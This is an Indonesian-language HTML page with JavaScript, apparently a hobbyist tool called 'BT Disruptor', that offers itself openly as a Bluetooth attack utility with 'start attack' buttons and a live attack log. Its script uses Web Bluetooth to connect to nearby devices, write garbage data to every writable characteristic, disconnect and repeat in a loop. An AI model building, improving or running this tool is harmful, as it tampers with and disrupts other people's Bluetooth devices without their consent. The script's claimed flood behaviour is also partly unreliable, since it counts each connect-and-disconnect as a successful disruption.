<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>BT Signal Disruptor</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
        body {
            background: #0a0a0f;
            font-family: 'Inter', -apple-system, 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: #e0e0e0;
        }
        .card-disrupt {
            background: #1a1a2e;
            border: 1px solid #2a2a4e;
            border-radius: 28px;
            padding: 32px 24px;
            max-width: 480px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
            animation: fadeUp 0.5s ease;
        }
        @keyframes fadeUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo .icon-wrapper {
            display: inline-block;
            background: linear-gradient(135deg, #ff1a1a, #cc0000);
            width: 64px;
            height: 64px;
            border-radius: 20px;
            line-height: 64px;
            text-align: center;
            box-shadow: 0 8px 24px rgba(255, 0, 0, 0.25);
            margin-bottom: 10px;
        }
        .logo .icon-wrapper i { font-size: 32px; color: #fff; }
        .logo .brand {
            font-size: 24px;
            font-weight: 800;
            letter-spacing: -0.5px;
            color: #fff;
        }
        .logo .brand span { color: #ff1a1a; }
        .logo .sub {
            color: #6a6a8a;
            font-size: 13px;
            letter-spacing: 1px;
        }

        .badge-status {
            display: inline-block;
            padding: 4px 16px;
            border-radius: 60px;
            font-size: 12px;
            font-weight: 600;
            margin-top: 4px;
        }
        .badge-status.attacking {
            background: #ff1a1a;
            color: #fff;
            animation: blink 0.5s infinite;
        }
        .badge-status.idle {
            background: #2a2a4e;
            color: #6a6a8a;
        }
        .badge-status.scanning {
            background: #ff8800;
            color: #000;
            animation: blink 0.8s infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        .stats {
            display: flex;
            justify-content: space-around;
            padding: 12px 0;
            border-top: 1px solid #1a1a2e;
            border-bottom: 1px solid #1a1a2e;
            margin: 12px 0;
        }
        .stats .stat {
            text-align: center;
        }
        .stats .stat .number {
            font-size: 24px;
            font-weight: 700;
            color: #ff1a1a;
        }
        .stats .stat .label {
            font-size: 11px;
            color: #4a4a6a;
        }

        .btn-attack {
            background: linear-gradient(135deg, #ff1a1a, #cc0000);
            border: none;
            border-radius: 60px;
            padding: 16px;
            font-weight: 700;
            font-size: 18px;
            color: #fff;
            width: 100%;
            transition: 0.3s;
            box-shadow: 0 4px 24px rgba(255, 0, 0, 0.3);
            font-family: 'Inter', sans-serif;
            margin-top: 8px;
        }
        .btn-attack:hover {
            transform: scale(1.02);
            box-shadow: 0 8px 40px rgba(255, 0, 0, 0.5);
        }
        .btn-attack:active { transform: scale(0.96); }
        .btn-attack:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        .btn-attack i { margin-right: 10px; }

        .btn-attack.stop {
            background: linear-gradient(135deg, #333, #1a1a1a);
            box-shadow: 0 4px 24px rgba(0,0,0,0.3);
        }
        .btn-attack.stop:hover {
            box-shadow: 0 8px 40px rgba(0,0,0,0.5);
        }

        .log-container {
            background: #0a0a1a;
            border-radius: 14px;
            padding: 12px 16px;
            max-height: 120px;
            overflow-y: auto;
            margin-top: 12px;
            border: 1px solid #1a1a2e;
            font-family: monospace;
            font-size: 12px;
            color: #6a6a8a;
        }
        .log-container::-webkit-scrollbar { width: 4px; }
        .log-container::-webkit-scrollbar-track { background: #0a0a1a; }
        .log-container::-webkit-scrollbar-thumb { background: #2a2a4e; border-radius: 10px; }
        .log-container .log-entry {
            padding: 2px 0;
            border-bottom: 1px solid #0a0a1a;
        }
        .log-container .log-entry .time {
            color: #4a4a6a;
            margin-right: 8px;
        }
        .log-container .log-entry .found {
            color: #00ff44;
        }
        .log-container .log-entry .attempt {
            color: #ff8800;
        }
        .log-container .log-entry .failed {
            color: #ff1a1a;
        }
        .log-container .log-entry .success {
            color: #00ff44;
        }

        .footer-text {
            text-align: center;
            color: #4a4a6a;
            font-size: 12px;
            margin-top: 20px;
            border-top: 1px solid #1a1a2e;
            padding-top: 16px;
        }
        .footer-text strong { color: #ff1a1a; }

        .toast-container {
            position: fixed;
            bottom: 24px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 9999;
            background: #1a1a2e;
            color: #fff;
            padding: 12px 24px;
            border-radius: 60px;
            font-size: 14px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
            display: none;
            font-family: 'Inter', sans-serif;
            max-width: 90%;
            text-align: center;
        }

        @media (max-width: 400px) {
            .stats .stat .number { font-size: 20px; }
            .btn-attack { font-size: 16px; padding: 14px; }
        }
    </style>
</head>
<body>

<div class="card-disrupt">

    <!-- LOGO -->
    <div class="logo">
        <div class="icon-wrapper"><i class="bi bi-bluetooth-off"></i></div>
        <div class="brand">BT <span>Disruptor</span></div>
        <div class="sub">Bluetooth Signal Disruptor</div>
        <span class="badge-status idle" id="statusBadge"><i class="bi bi-dot"></i> Idle</span>
    </div>

    <!-- ===== STATS ===== -->
    <div class="stats">
        <div class="stat">
            <div class="number" id="deviceFound">0</div>
            <div class="label">Device Ditemukan</div>
        </div>
        <div class="stat">
            <div class="number" id="attackAttempts">0</div>
            <div class="label">Percobaan</div>
        </div>
        <div class="stat">
            <div class="number" id="attackSuccess">0</div>
            <div class="label">Berhasil</div>
        </div>
    </div>

    <!-- ===== LOG ===== -->
    <div class="log-container" id="logContainer">
        <div class="log-entry" style="color: #4a4a6a;">[System] Siap menyerang...</div>
    </div>

    <!-- ===== BUTTONS ===== -->
    <button class="btn-attack" id="btnAttack"><i class="bi bi-lightning-fill"></i> MULAI SERANGAN</button>

    <div class="footer-text">
        &copy; 2026 <strong>BT Disruptor</strong> — by samil
    </div>
</div>

<!-- ===== TOAST ===== -->
<div class="toast-container" id="toast">Pesan</div>

<script>
    // ============================================================
    // BLUETOOTH SIGNAL DISRUPTOR — SPAM SCAN + FLOOD CONNECT
    // ============================================================

    // ===== STATE =====
    let isAttacking = false;
    let attackInterval = null;
    let deviceFound = 0;
    let attackAttempts = 0;
    let attackSuccess = 0;
    let discoveredDevices = [];

    // ===== DOM =====
    const btnAttack = document.getElementById('btnAttack');
    const statusBadge = document.getElementById('statusBadge');
    const logContainer = document.getElementById('logContainer');
    const deviceFoundEl = document.getElementById('deviceFound');
    const attackAttemptsEl = document.getElementById('attackAttempts');
    const attackSuccessEl = document.getElementById('attackSuccess');
    const toast = document.getElementById('toast');

    // ============================================================
    // TOAST
    // ============================================================
    function showToast(message, duration = 3000) {
        toast.textContent = message;
        toast.style.display = 'block';
        clearTimeout(toast._timer);
        toast._timer = setTimeout(() => {
            toast.style.display = 'none';
        }, duration);
    }

    // ============================================================
    // LOG
    // ============================================================
    function addLog(message, type = 'info') {
        const entry = document.createElement('div');
        entry.className = 'log-entry';
        const time = new Date().toLocaleTimeString('id-ID');
        let color = '';
        if (type === 'found') color = 'found';
        else if (type === 'attempt') color = 'attempt';
        else if (type === 'failed') color = 'failed';
        else if (type === 'success') color = 'success';

        entry.innerHTML = `<span class="time">[${time}]</span><span class="${color}">${message}</span>`;
        logContainer.appendChild(entry);
        logContainer.scrollTop = logContainer.scrollHeight;

        // Batasi log
        while (logContainer.children.length > 50) {
            logContainer.removeChild(logContainer.firstChild);
        }
    }

    // ============================================================
    // UPDATE STATS
    // ============================================================
    function updateStats() {
        deviceFoundEl.textContent = deviceFound;
        attackAttemptsEl.textContent = attackAttempts;
        attackSuccessEl.textContent = attackSuccess;
    }

    // ============================================================
    // SET STATUS
    // ============================================================
    function setStatus(text, type = 'idle') {
        statusBadge.textContent = text;
        statusBadge.className = 'badge-status ' + type;
        if (type === 'attacking') {
            statusBadge.innerHTML = '<i class="bi bi-lightning-fill"></i> ' + text;
        } else if (type === 'scanning') {
            statusBadge.innerHTML = '<i class="bi bi-arrow-repeat"></i> ' + text;
        } else {
            statusBadge.innerHTML = '<i class="bi bi-dot"></i> ' + text;
        }
    }

    // ============================================================
    // CEK SUPPORT BLUETOOTH
    // ============================================================
    if (!navigator.bluetooth) {
        showToast('❌ Web Bluetooth tidak support. Gunakan Chrome/Edge.', 5000);
        btnAttack.disabled = true;
        addLog('❌ Browser tidak support Web Bluetooth', 'failed');
    }

    // ============================================================
    // SCAN & FLOOD CONNECT (DISRUPTOR CORE)
    // ============================================================
    async function disrupt() {
        if (!isAttacking) return;

        try {
            addLog('🔍 Scan perangkat BLE...', 'attempt');

            // === SCAN ===
            const device = await navigator.bluetooth.requestDevice({
                acceptAllDevices: true,
                optionalServices: []
            });

            deviceFound++;
            const deviceName = device.name || 'Unnamed Device';
            addLog(`📡 Ditemukan: ${deviceName} (${device.id})`, 'found');

            // === FLOOD CONNECT ATTEMPT ===
            attackAttempts++;
            addLog(`🔌 Mencoba konek ke ${deviceName}...`, 'attempt');

            try {
                const server = await device.gatt.connect();
                // Kirim garbage data (jika ada karakteristik)
                try {
                    const services = await server.getPrimaryServices();
                    for (let svc of services) {
                        try {
                            const chars = await svc.getCharacteristics();
                            for (let c of chars) {
                                if (c.properties.write || c.properties.writeWithoutResponse) {
                                    try {
                                        // Kirim garbage data
                                        const encoder = new TextEncoder();
                                        const garbage = encoder.encode('DISRUPT');
                                        await c.writeValue(garbage);
                                        addLog(`💥 Spam data ke ${deviceName}`, 'success');
                                    } catch(e) {}
                                }
                            }
                        } catch(e) {}
                    }
                } catch(e) {}

                // Disconnect langsung
                await server.disconnect();
                attackSuccess++;
                addLog(`✅ Berhasil ganggu ${deviceName}`, 'success');

            } catch(e) {
                addLog(`❌ Gagal konek: ${e.message}`, 'failed');
            }

            updateStats();

        } catch (error) {
            if (error.message.includes('cancelled')) {
                addLog('⏹️ Scan dibatalkan user', 'failed');
            } else {
                addLog(`❌ Error: ${error.message}`, 'failed');
            }
        }

        // Lanjut attack
        if (isAttacking) {
            setTimeout(disrupt, 500);
        }
    }

    // ============================================================
    // MULAI / HENTIKAN SERANGAN
    // ============================================================
    function toggleAttack() {
        if (isAttacking) {
            // STOP
            isAttacking = false;
            btnAttack.innerHTML = '<i class="bi bi-lightning-fill"></i> MULAI SERANGAN';
            btnAttack.className = 'btn-attack';
            setStatus('Idle', 'idle');
            addLog('⏹️ Serangan dihentikan', 'failed');
            showToast('⏹️ Serangan dihentikan', 2000);
        } else {
            // START
            if (!navigator.bluetooth) {
                showToast('❌ Web Bluetooth tidak support', 4000);
                return;
            }
            isAttacking = true;
            btnAttack.innerHTML = '<i class="bi bi-stop-fill"></i> HENTIKAN SERANGAN';
            btnAttack.className = 'btn-attack stop';
            setStatus('Menyerang...', 'attacking');
            addLog('⚡ SERANGAN DIMULAI!', 'success');
            showToast('⚡ Serangan dimulai!', 2000);
            // Reset stats
            deviceFound = 0;
            attackAttempts = 0;
            attackSuccess = 0;
            updateStats();
            // Mulai disrupt
            setTimeout(disrupt, 500);
        }
    }

    // ============================================================
    // EVENT LISTENERS
    // ============================================================
    btnAttack.addEventListener('click', toggleAttack);

    // ============================================================
    // INIT
    // ============================================================
    setStatus('Idle', 'idle');
    updateStats();
    addLog('[System] Siap mengganggu sinyal Bluetooth', 'info');

    console.log('🔍 BT Disruptor siap');
</script>

</body>
                </html>
